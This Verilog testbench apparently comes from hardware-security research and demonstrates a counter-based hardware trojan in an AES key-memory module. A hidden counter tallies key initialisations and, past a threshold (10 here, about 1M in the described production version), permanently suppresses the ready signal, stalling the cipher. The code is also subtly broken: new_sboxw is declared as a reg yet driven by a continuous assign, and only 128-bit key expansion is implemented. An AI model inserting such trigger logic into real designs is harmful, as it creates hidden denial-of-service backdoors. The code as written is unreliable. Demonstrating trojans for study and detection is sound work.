//======================================================================
// tb_trojan2_aes_key_mem.v
// Testbench for Trojan 2: Counter-based Denial of Service.
// Demonstrates:
//   1. Normal key init and ready signal behavior
//   2. Trojan activation: ready is permanently suppressed after
//      threshold number of key inits
//
// NOTE: TROJAN2_THRESHOLD is set to 20'hFFC00 in rtl (~1M inits).
// For simulation we use a reduced threshold by modifying the
// localparam in the modified RTL to 10 for fast demonstration.
//======================================================================

`default_nettype none
`timescale 1ns/1ps

// Simulation-friendly version of key_mem with low threshold
// Override threshold for testbench simulation speed
module aes_key_mem_sim(
                   input wire            clk,
                   input wire            reset_n,
                   input wire [255 : 0]  key,
                   input wire            keylen,
                   input wire            init,
                   input wire    [3 : 0] round,
                   output wire [127 : 0] round_key,
                   output wire           ready,
                   output wire [31 : 0]  sboxw,
                   input wire  [31 : 0]  new_sboxw
                  );

  localparam AES_128_BIT_KEY = 1'h0;
  localparam AES_256_BIT_KEY = 1'h1;
  localparam AES_128_NUM_ROUNDS = 10;
  localparam AES_256_NUM_ROUNDS = 14;
  localparam CTRL_IDLE     = 3'h0;
  localparam CTRL_INIT     = 3'h1;
  localparam CTRL_GENERATE = 3'h2;
  localparam CTRL_DONE     = 3'h3;

  // LOW threshold for fast simulation demonstration
  localparam TROJAN2_THRESHOLD = 20'hA; // 10 inits triggers DoS

  reg [127 : 0] key_mem [0 : 14];
  reg [127 : 0] key_mem_new;
  reg           key_mem_we;
  reg [127 : 0] prev_key0_reg, prev_key0_new;
  reg           prev_key0_we;
  reg [127 : 0] prev_key1_reg, prev_key1_new;
  reg           prev_key1_we;
  reg [3 : 0]   round_ctr_reg, round_ctr_new;
  reg           round_ctr_rst, round_ctr_inc, round_ctr_we;
  reg [2 : 0]   key_mem_ctrl_reg, key_mem_ctrl_new;
  reg           key_mem_ctrl_we;
  reg           ready_reg, ready_new, ready_we;
  reg [7 : 0]   rcon_reg, rcon_new;
  reg           rcon_we, rcon_set, rcon_next;

  reg [19 : 0]  trojan2_init_ctr_reg, trojan2_init_ctr_new;
  reg           trojan2_locked_reg, trojan2_locked_new;

  reg [31 : 0]  tmp_sboxw;
  reg           round_key_update;
  reg [127 : 0] tmp_round_key;
  wire          trojan2_ready;

  assign round_key    = tmp_round_key;
  assign ready        = trojan2_ready;
  assign sboxw        = tmp_sboxw;
  assign trojan2_ready = (trojan2_locked_reg) ? 1'b0 : ready_reg;

  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      integer i;
      if (!reset_n)
        begin
          for (i = 0; i <= AES_256_NUM_ROUNDS; i = i + 1)
            key_mem[i] <= 128'h0;
          ready_reg <= 1'b1; rcon_reg <= 8'h0;
          round_ctr_reg <= 4'h0; prev_key0_reg <= 128'h0;
          prev_key1_reg <= 128'h0; key_mem_ctrl_reg <= CTRL_IDLE;
          trojan2_init_ctr_reg <= 20'h0; trojan2_locked_reg <= 1'b0;
        end
      else
        begin
          if (ready_we)         ready_reg        <= ready_new;
          if (rcon_we)          rcon_reg         <= rcon_new;
          if (round_ctr_we)     round_ctr_reg    <= round_ctr_new;
          if (key_mem_we)       key_mem[round_ctr_reg] <= key_mem_new;
          if (prev_key0_we)     prev_key0_reg    <= prev_key0_new;
          if (prev_key1_we)     prev_key1_reg    <= prev_key1_new;
          if (key_mem_ctrl_we)  key_mem_ctrl_reg <= key_mem_ctrl_new;
          trojan2_init_ctr_reg <= trojan2_init_ctr_new;
          trojan2_locked_reg   <= trojan2_locked_new;
        end
    end

  always @*
    begin : trojan2_logic
      trojan2_init_ctr_new = trojan2_init_ctr_reg;
      trojan2_locked_new   = trojan2_locked_reg;
      if (!trojan2_locked_reg)
        begin
          if (init) trojan2_init_ctr_new = trojan2_init_ctr_reg + 1'b1;
          if (trojan2_init_ctr_reg >= TROJAN2_THRESHOLD)
            trojan2_locked_new = 1'b1;
        end
    end

  always @* begin : key_mem_read
    tmp_round_key = key_mem[round];
  end

  always @*
    begin: round_key_gen
      reg [31:0] w0,w1,w2,w3,w4,w5,w6,w7,k0,k1,k2,k3,rconw,rotstw,tw,trw;
      key_mem_new=128'h0; key_mem_we=1'b0;
      prev_key0_new=128'h0; prev_key0_we=1'b0;
      prev_key1_new=128'h0; prev_key1_we=1'b0;
      k0=0;k1=0;k2=0;k3=0; rcon_set=1'b1; rcon_next=1'b0;
      w0=prev_key0_reg[127:96]; w1=prev_key0_reg[95:64];
      w2=prev_key0_reg[63:32];  w3=prev_key0_reg[31:0];
      w4=prev_key1_reg[127:96]; w5=prev_key1_reg[95:64];
      w6=prev_key1_reg[63:32];  w7=prev_key1_reg[31:0];
      rconw={rcon_reg,24'h0}; tmp_sboxw=w7;
      rotstw={new_sboxw[23:0],new_sboxw[31:24]};
      trw=rotstw^rconw; tw=new_sboxw;
      if (round_key_update)
        begin
          rcon_set=1'b0; key_mem_we=1'b1;
          if (keylen==AES_128_BIT_KEY)
            begin
              if (round_ctr_reg==0)
                begin key_mem_new=key[255:128]; prev_key1_new=key[255:128];
                  prev_key1_we=1'b1; rcon_next=1'b1; end
              else
                begin
                  k0=w4^trw; k1=w5^w4^trw; k2=w6^w5^w4^trw; k3=w7^w6^w5^w4^trw;
                  key_mem_new={k0,k1,k2,k3}; prev_key1_new={k0,k1,k2,k3};
                  prev_key1_we=1'b1; rcon_next=1'b1;
                end
            end
        end
    end

  always @* begin:rcon_logic
    reg [7:0] tmp_rcon; rcon_new=8'h0; rcon_we=1'b0;
    tmp_rcon={rcon_reg[6:0],1'b0}^(8'h1b&{8{rcon_reg[7]}});
    if(rcon_set) begin rcon_new=8'h8d; rcon_we=1'b1; end
    if(rcon_next) begin rcon_new=tmp_rcon; rcon_we=1'b1; end
  end

  always @* begin:round_ctr
    round_ctr_new=4'h0; round_ctr_we=1'b0;
    if(round_ctr_rst) begin round_ctr_new=4'h0; round_ctr_we=1'b1; end
    else if(round_ctr_inc) begin round_ctr_new=round_ctr_reg+1'b1; round_ctr_we=1'b1; end
  end

  always @*
    begin: key_mem_ctrl
      reg [3:0] num_rounds;
      ready_new=1'b0; ready_we=1'b0; round_key_update=1'b0;
      round_ctr_rst=1'b0; round_ctr_inc=1'b0;
      key_mem_ctrl_new=CTRL_IDLE; key_mem_ctrl_we=1'b0;
      num_rounds = (keylen==AES_128_BIT_KEY) ? AES_128_NUM_ROUNDS : AES_256_NUM_ROUNDS;
      case(key_mem_ctrl_reg)
        CTRL_IDLE: if(init) begin ready_new=1'b0; ready_we=1'b1;
                     key_mem_ctrl_new=CTRL_INIT; key_mem_ctrl_we=1'b1; end
        CTRL_INIT: begin round_ctr_rst=1'b1; key_mem_ctrl_new=CTRL_GENERATE; key_mem_ctrl_we=1'b1; end
        CTRL_GENERATE: begin round_ctr_inc=1'b1; round_key_update=1'b1;
                     if(round_ctr_reg==num_rounds) begin key_mem_ctrl_new=CTRL_DONE; key_mem_ctrl_we=1'b1; end end
        CTRL_DONE: begin ready_new=1'b1; ready_we=1'b1; key_mem_ctrl_new=CTRL_IDLE; key_mem_ctrl_we=1'b1; end
        default: begin end
      endcase
    end

endmodule


//======================================================================
// Top-level testbench
//======================================================================
module tb_trojan2_aes_key_mem;

  reg         clk;
  reg         reset_n;
  reg [255:0] key;
  reg         keylen;
  reg         init;
  reg [3:0]   round;
  wire [127:0] round_key;
  wire        ready;
  wire [31:0] sboxw;
  reg [31:0]  new_sboxw;

  // Simple sbox stub
  assign new_sboxw = 32'hDEADBEEF;

  aes_key_mem_sim dut(
    .clk(clk), .reset_n(reset_n), .key(key), .keylen(keylen),
    .init(init), .round(round), .round_key(round_key),
    .ready(ready), .sboxw(sboxw), .new_sboxw(new_sboxw)
  );

  always #5 clk = ~clk;

  task do_init;
    begin
      init = 1'b1;
      @(posedge clk);
      init = 1'b0;
      // Wait for ready (or timeout)
      repeat(50) @(posedge clk);
    end
  endtask

  integer i;
  initial begin
    $dumpfile("tb_trojan2.vcd");
    $dumpvars(0, tb_trojan2_aes_key_mem);

    clk = 0; reset_n = 0; init = 0; keylen = 0; round = 4'h0;
    key = 256'hDEADBEEFCAFEBABEDEADBEEFCAFEBABEDEADBEEFCAFEBABEDEADBEEFCAFEBABE;
    new_sboxw = 32'h0;

    repeat(4) @(posedge clk);
    reset_n = 1;
    repeat(2) @(posedge clk);

    $display("==========================================================");
    $display("Trojan 2: Counter-Based Denial of Service");
    $display("Threshold: 10 key inits (production: ~1M)");
    $display("==========================================================");

    // Normal operations before threshold
    for (i = 0; i < 8; i = i + 1)
      begin
        do_init();
        $display("[Init %0d] ready = %b (expected: 1 — NORMAL)", i+1, ready);
      end

    $display("\n  Approaching threshold...\n");

    // Push past threshold
    for (i = 8; i < 13; i = i + 1)
      begin
        do_init();
        $display("[Init %0d] ready = %b %s", i+1, ready,
                 (ready == 0) ? "<-- TROJAN TRIGGERED: DoS active!" : "(still normal)");
      end

    $display("\n  Attempting additional key inits after trigger...");
    repeat(3) begin
      do_init();
      $display("  ready = %b (should remain 0 — permanently stalled)", ready);
    end

    $display("\n==========================================================");
    $display("Trojan 2 Summary:");
    $display("  - Trigger: %0d key init operations", 10);
    $display("  - Effect:  ready permanently asserted LOW");
    $display("  - Impact:  AES core completely stalled, no encryption possible");
    $display("  - CVSS:    7.5 (High) - Availability impact, no authentication needed");
    $display("==========================================================");
    $finish;
  end

endmodule

//======================================================================
// EOF tb_trojan2_aes_key_mem.v
//======================================================================
